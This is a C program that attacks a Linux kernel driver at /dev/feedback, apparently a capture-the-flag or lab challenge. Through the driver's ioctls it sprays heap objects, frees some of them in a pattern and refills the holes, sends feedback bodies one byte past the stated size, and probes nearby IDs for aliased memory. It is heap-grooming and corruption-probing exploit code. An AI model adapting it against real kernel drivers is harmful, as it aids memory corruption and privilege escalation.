#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    errno = 0;
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) exit(1);
    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;
    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int read_fb(int fd, uint64_t id, char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = out };
    return xioctl(fd, CMD_READ, &req);
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const int n40 = 180;
    const int n30 = 220;
    const uint64_t base40 = 0xE00000;
    const uint64_t base30 = 0xE10000;
    const uint64_t refill = 0xE20000;

    unsigned char marker[180];
    for (int i = 0; i < n40; i++) marker[i] = (unsigned char)(0x40 + (i % 40));

    for (int i = 0; i < n40; i++) {
        create_fb(fd, base40 + i, 0x40, marker[i], 0x5a);
    }
    for (int i = 0; i < n40; i++) {
        if ((i % 3) == 0 || (i % 11) == 0) del_fb(fd, base40 + i);
    }
    for (int i = 0; i < n30; i++) {
        create_fb(fd, base30 + i, 0x30, 0x31, (unsigned char)i);
    }
    for (int i = 0; i < 320; i++) {
        create_fb(fd, refill + i, 0x40, 0x44, (unsigned char)((0x80 + i) & 0xff));
    }

    uint64_t broken[180];
    int broken_n = 0;
    char out[0x80];

    puts("[+] collecting broken IDs");
    for (int i = 0; i < n40; i++) {
        uint64_t id = base40 + i;
        if (read_fb(fd, id, out, sizeof(out)) != 0) {
            if (errno == 22 && broken_n < 180) {
                broken[broken_n++] = id;
            }
        }
    }
    printf("[+] broken_n=%d\n", broken_n);

    puts("[+] alias probing around broken IDs (delta -0x200..+0x200)");
    int alias_hits = 0;
    for (int b = 0; b < broken_n && b < 24; b++) {
        uint64_t bid = broken[b];
        int local = 0;
        for (int d = -0x200; d <= 0x200; d++) {
            uint64_t qid = (uint64_t)((int64_t)bid + d);
            if (qid == bid) continue;
            if (read_fb(fd, qid, out, sizeof(out)) == 0) {
                unsigned char v = (unsigned char)out[0];
                if (v >= 0x40 && v < 0x40 + 40) {
                    alias_hits++;
                    local++;
                    printf("ALIAS broken=%llu -> qid=%llu delta=%d marker=0x%02x\n",
                           (unsigned long long)bid,
                           (unsigned long long)qid,
                           d,
                           v);
                    if (local >= 4) break;
                }
            }
        }
    }
    printf("[+] alias_hits=%d\n", alias_hits);

    for (int i = 0; i < n40; i++) del_fb(fd, base40 + i);
    for (int i = 0; i < n30; i++) del_fb(fd, base30 + i);
    for (int i = 0; i < 320; i++) del_fb(fd, refill + i);

    close(fd);
    return 0;
}
